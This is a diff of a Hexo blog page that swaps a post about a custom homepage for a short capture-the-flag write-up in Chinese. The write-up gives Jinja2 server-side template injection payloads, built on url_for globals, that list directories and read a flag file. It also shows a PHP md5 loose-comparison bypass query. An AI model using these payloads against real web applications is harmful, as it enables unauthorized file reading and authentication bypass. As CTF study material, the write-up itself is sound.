@@ -77,7 +77,7 @@
 <link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="hexo," />
+  <meta name="keywords" content="Hexo, NexT" />
 
 
 
@@ -93,17 +93,17 @@
 
 
 
-<meta name="description" content="一直就想给博客加个自己的首页看到了喜欢的特效就毫不犹豫的动手了">
-<meta name="keywords" content="hexo">
+<meta name="description" content="hackit 就看了一道题 又一道py沙盒。。。">
+<meta name="keywords">
 <meta property="og:type" content="article">
-<meta property="og:title" content="hexo自定义主页">
-<meta property="og:url" content="http://Merl1ng.com/2017/08/10/hexo自定义主页/index.html">
+<meta property="og:title" content="hackit&icewp">
+<meta property="og:url" content="http://Merl1ng.com/2018/09/10/hackit&icewp/index.html">
 <meta property="og:site_name" content="Merl1ng's blog">
-<meta property="og:description" content="一直就想给博客加个自己的首页看到了喜欢的特效就毫不犹豫的动手了">
-<meta property="og:updated_time" content="2017-08-19T09:50:10.669Z">
+<meta property="og:description" content="hackit 就看了一道题 又一道py沙盒。。。">
+<meta property="og:updated_time" content="2018-09-15T14:28:36.395Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="hexo自定义主页">
-<meta name="twitter:description" content="一直就想给博客加个自己的首页看到了喜欢的特效就毫不犹豫的动手了">
+<meta name="twitter:title" content="hackit&icewp">
+<meta name="twitter:description" content="hackit 就看了一道题 又一道py沙盒。。。">
 
 
 
@@ -131,13 +131,13 @@
 
 
 
-  <link rel="canonical" href="http://Merl1ng.com/2017/08/10/hexo自定义主页/"/>
+  <link rel="canonical" href="http://Merl1ng.com/2018/09/10/hackit&icewp/"/>
 
 
 
 
 
-  <title>hexo自定义主页 | Merl1ng's blog</title>
+  <title>hackit&icewp | Merl1ng's blog</title>
   
 
 
@@ -266,7 +266,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://Merl1ng.com/2017/08/10/hexo自定义主页/">
+    <link itemprop="mainEntityOfPage" href="http://Merl1ng.com/2018/09/10/hackit&icewp/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Merl1ng">
@@ -283,7 +283,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">hexo自定义主页</h1>
+          <h1 class="post-title" itemprop="name headline">hackit&icewp</h1>
         
 
         <div class="post-meta">
@@ -295,8 +295,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-08-10T16:34:10+08:00">
-                2017-08-10
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-10T22:14:46+08:00">
+                2018-09-10
               </time>
             
 
@@ -305,28 +305,6 @@
             
           </span>
 
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/setting/" itemprop="url" rel="index">
-                    <span itemprop="name">setting</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
           
 
           
@@ -352,18 +330,26 @@
       
 
       
-        <p>一直就想给博客加个自己的首页<br>看到了喜欢的特效就毫不犹豫的动手了</p>
-<a id="more"></a>
-<p>其实如果有云服务器就不用这么麻烦了 以下操作前提是在github的博客</p>
-<p>首先有一个自己的域名 并且解析到你已经搭建好的github博客地址 (yourname.github.io)</p>
-<p>新建一个repository 这里我命名为 Home-page<br>根据提示在git下复制代码进去</p>
-<p>到域名注册的地方新增一个二级域名解析 同样指向你的github博客地址<br>然后在Home-page新建文件CNAME 把你的二级域名写进去 </p>
-<p>Home-page里到setting 再到 github page 新建一个页面 此时将指向你的二级域名 </p>
-<p>把你喜欢的首页改名为index.html放到 Home-page 里面 (首页里超链接指向博客 <em>废话</em>)<br>index文件里引用的css jpg等等 直接放到云上比较方便 然后把herf改成外链</p>
-<p>到这里你的自定义首页就完成了<br>我这里首页是 blog.merl1ng.cc 博客是 merl1ng.cc</p>
-<p>但是问题又来了 因为是先绑的顶级域名 首页和博客的域名交换一下比较好</p>
-<p>这里域名的解析不用改 只用到github上把两个仓库根目录的CNAME文件里的域名交换一波<br>把index.html里的超链接改一下(不改一直指向自己)<br>最后把本地hexo文件夹的source里的CNAME域名也改一下就完成了</p>
-<p>最终的效果 首页为 merl1ng.cc 博客 blog.merl1ng.cc<br>这样看起来比较舒服(≧∇≦)ﾉ 将来如果再新建别的二级域名 这个格式也比较方便 </p>
+        <p>hackit 就看了一道题 又一道py沙盒。。。<br><a id="more"></a></p>
+<h2 id="hackit"><a href="#hackit" class="headerlink" title="hackit"></a>hackit</h2><p>之所以想记录下是因为用到了 tokyo上的 <strong>url_for</strong></p>
+<p>fuzz过滤了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[<span class="string">"["</span>,<span class="string">"]"</span>,<span class="string">"config"</span>,<span class="string">"self"</span>,<span class="string">"from_pyfile"</span>,<span class="string">"|"</span>,<span class="string">"join"</span>,<span class="string">"mro"</span>,<span class="string">"class"</span>,<span class="string">"request"</span>,<span class="string">"pop"</span>,<span class="string">"attr"</span>,<span class="string">"args"</span>,<span class="string">"+"</span>]</div></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&#123;&#123;url_for.__globals__.__getitem__(<span class="string">'os'</span>).listdir(<span class="string">'./'</span>)&#125;&#125;</div><div class="line"></div><div class="line">&#123;&#123;url_for.__globals__.__getitem__(<span class="string">'__builtins__'</span>).__getitem__(<span class="string">'open'</span>)(<span class="string">'flag_secret_file_910230912900891283'</span>).read()&#125;&#125;</div></pre></td></tr></table></figure>
+<p>或者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;&#123;url_for.__globals__.send_file(<span class="string">'/opt/app/flag_secret_file_910230912900891283'</span>).response.text&#125;&#125;</div></pre></td></tr></table></figure></p>
+<p>参考<br><a href="https://ctftime.org/writeup/11002" target="_blank" rel="external">https://ctftime.org/writeup/11002</a><br><a href="https://graneed.hatenablog.com/entry/2018/09/10/180318" target="_blank" rel="external">https://graneed.hatenablog.com/entry/2018/09/10/180318</a></p>
+<p>好吧再补一道</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">include <span class="string">'flag.php'</span>;</div><div class="line"><span class="variable">$username</span> = substr(<span class="variable">$_GET</span>[<span class="string">'u'</span>],0,25);</div><div class="line"><span class="variable">$password</span> = substr(<span class="variable">$_GET</span>[<span class="string">'p'</span>],0,45);</div><div class="line"><span class="built_in">echo</span> <span class="string">"Hello &lt;b&gt;Baby:&lt;/b&gt;&lt;br&gt;You may need &lt;a href=\"/?source\"&gt;this&lt;/a&gt; and/or &lt;a href=\"/auth.so\"&gt;this&lt;/a&gt;&lt;br&gt;"</span>;</div><div class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'source'</span>]))&#123;</div><div class="line">    show_source(__FILE__);</div><div class="line">&#125;</div><div class="line"><span class="variable">$digest</span> = @auth(<span class="variable">$username</span>,<span class="variable">$password</span>);</div><div class="line"><span class="keyword">if</span> (md5(<span class="variable">$username</span>) == md5(<span class="variable">$digest</span>)  and <span class="variable">$digest</span> !== <span class="variable">$username</span>)&#123;</div><div class="line">    <span class="built_in">echo</span> <span class="string">"you are a good boy here is your flag : &lt;b&gt;<span class="variable">$flag</span>&lt;/b&gt;"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line">    <span class="built_in">echo</span> <span class="string">"you are not a good boy so  no flag for you :("</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>$digest = @auth($username,$password); 不知道</p>
+<p>还给了so 又得逆。。 但可以较快看出一个溢出 不用全逆</p>
+<p>所以 md5漏洞 但加个溢出 暴力尝试直到</p>
+<p>?u=240610708&amp;p=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA240610708</p>
+<h2 id="ice"><a href="#ice" class="headerlink" title="ice"></a>ice</h2><p>web 很简单 </p>
+<h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>https御剑可以扫</p>
+<p>robots.txt</p>
+<h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>css里</p>
+<h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>随便访问个不存在页面</p>
+<h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>cookies</p>
+<p>jwt解开</p>
 
       
     </div>
@@ -391,12 +377,6 @@
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/hexo/" rel="tag"><i class="fa fa-tag"></i> hexo</a>
-          
-        </div>
-      
 
       
       
@@ -406,18 +386,14 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/08/13/php弱匹配和json/" rel="next" title="php弱匹配和json">
-                <i class="fa fa-chevron-left"></i> php弱匹配和json
-              </a>
-            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/08/07/wifi破解/" rel="prev" title="wifi破解">
-                wifi破解 <i class="fa fa-chevron-right"></i>
+              <a href="/2018/09/09/noxctfwp/" rel="prev" title="noxctfwp">
+                noxctfwp <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -466,8 +442,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel sidebar-panel-active">
+      <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/images/avatar.gif"
@@ -549,6 +534,22 @@
 
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#hackit"><span class="nav-number">1.</span> <span class="nav-text">hackit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ice"><span class="nav-number">2.</span> <span class="nav-text">ice</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1"><span class="nav-number">2.1.</span> <span class="nav-text">1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2"><span class="nav-number">2.2.</span> <span class="nav-text">2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3"><span class="nav-number">2.3.</span> <span class="nav-text">3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4"><span class="nav-number">2.4.</span> <span class="nav-text">4</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
